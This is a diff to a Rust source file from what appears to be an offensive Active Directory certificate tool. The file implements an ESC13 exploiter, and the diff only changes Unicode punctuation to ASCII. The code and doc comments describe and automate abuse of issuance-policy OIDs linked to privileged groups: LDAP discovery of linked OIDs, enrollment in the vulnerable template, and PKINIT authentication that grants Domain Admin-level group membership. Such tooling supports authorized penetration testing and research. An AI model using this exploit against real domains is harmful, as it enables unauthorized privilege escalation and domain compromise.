@@ -1,4 +1,4 @@
-//! ESC13 — Issuance Policy with OID-to-Group Link (`msDS-OIDToGroupLink`)
+//! ESC13 -- Issuance Policy with OID-to-Group Link (`msDS-OIDToGroupLink`)
 //!
 //! ESC13 exploits the Active Directory feature where a certificate **issuance
 //! policy OID** is linked to a security group via the `msDS-OIDToGroupLink`
@@ -10,7 +10,7 @@
 //! processing grants the user **transient membership** in the linked group for
 //! that session.  If the linked group is privileged (e.g. Domain Admins,
 //! Enterprise Admins), the user authenticating with the certificate gains
-//! elevated privileges — even if they don't normally hold group membership.
+//! elevated privileges -- even if they don't normally hold group membership.
 //!
 //! **Vulnerable configuration:**
 //! - A certificate template includes an issuance policy OID in the
@@ -25,8 +25,8 @@
 //! 2. Find a template whose `msPKI-Certificate-Policy` contains the linked OID
 //!    and that allows enrollment by the current user.
 //! 3. Request a certificate from that template.
-//! 4. Authenticate with the cert via PKINIT → TGT will include the linked group's SID
-//!    in the PAC → TGT grants group membership.
+//! 4. Authenticate with the cert via PKINIT -> TGT will include the linked group's SID
+//!    in the PAC -> TGT grants group membership.
 //!
 //! Reference: Jonas Bülow Knudsen (@Jonas_b_knudsen), "ESC13 Abuse Technique" (2023)
 
@@ -36,9 +36,9 @@ use crate::adcs::{IssuedCertificate, create_client_auth_csr};
 use crate::error::{OverthroneError, Result};
 use tracing::info;
 
-// ─────────────────────────────────────────────────────────
+// ---------------------------------------------------------
 //  Constants
-// ─────────────────────────────────────────────────────────
+// ---------------------------------------------------------
 
 /// LDAP attribute that links an issuance policy OID to a group
 pub const MSDS_OID_TO_GROUP_LINK: &str = "msDS-OIDToGroupLink";
@@ -52,9 +52,9 @@ pub const MSPKI_ENTERPRISE_OID_CLASS: &str = "msPKI-Enterprise-Oid";
 /// LDAP search path for OID objects (relative to the forest Configuration NC)
 pub const OID_CONTAINER_RDN: &str = "CN=OID,CN=Public Key Services,CN=Services,CN=Configuration";
 
-// ─────────────────────────────────────────────────────────
+// ---------------------------------------------------------
 //  Types
-// ─────────────────────────────────────────────────────────
+// ---------------------------------------------------------
 
 /// An issuance policy OID that is linked to a privileged group
 #[derive(Debug, Clone)]
@@ -112,9 +112,9 @@ pub struct Esc13Result {
     pub impact_description: String,
 }
 
-// ─────────────────────────────────────────────────────────
+// ---------------------------------------------------------
 //  LDAP discovery helpers
-// ─────────────────────────────────────────────────────────
+// ---------------------------------------------------------
 
 /// Generate the LDAP filter to find `msPKI-Enterprise-Oid` objects with
 /// `msDS-OIDToGroupLink` populated (i.e. all linked issuance policies).
@@ -123,17 +123,17 @@ pub fn linked_oid_ldap_filter() -> &'static str {
 }
 
 /// Build the LDAP base DN for OID objects given the forest root domain NC.
-/// Example: for `dc=corp,dc=local` → `CN=OID,CN=Public Key Services,
+/// Example: for `dc=corp,dc=local` -> `CN=OID,CN=Public Key Services,
 /// CN=Services,CN=Configuration,DC=corp,DC=local`
 pub fn oid_container_dn(forest_root_nc: &str) -> String {
     format!("{},{}", OID_CONTAINER_RDN, forest_root_nc)
 }
 
-// ─────────────────────────────────────────────────────────
+// ---------------------------------------------------------
 //  Exploiter
-// ─────────────────────────────────────────────────────────
+// ---------------------------------------------------------
 
-/// ESC13 exploiter — issuance policy OID-to-group link abuse
+/// ESC13 exploiter -- issuance policy OID-to-group link abuse
 pub struct Esc13Exploiter {
     web_client: WebEnrollmentClient,
 }
@@ -150,7 +150,7 @@ impl Esc13Exploiter {
         Ok(Self { web_client })
     }
 
-    /// Execute the ESC13 attack — enroll in the template containing the
+    /// Execute the ESC13 attack -- enroll in the template containing the
     /// linked issuance policy OID.
     pub async fn exploit(&self, config: &Esc13Config) -> Result<Esc13Result> {
         info!(
@@ -266,7 +266,7 @@ impl Esc13Exploiter {
                         } else {
                             tracing::warn!(
                                 "ESC13: Issuance policy OID {} NOT found in Certificate Policies \
-                                 extension — template may not link this OID",
+                                 extension -- template may not link this OID",
                                 expected_oid
                             );
                         }
@@ -274,7 +274,7 @@ impl Esc13Exploiter {
                     }
                 }
                 tracing::warn!(
-                    "ESC13: Certificate Policies extension (2.5.29.32) absent — \
+                    "ESC13: Certificate Policies extension (2.5.29.32) absent -- \
                      OID {} cannot be confirmed; template may not embed the issuance policy",
                     expected_oid
                 );
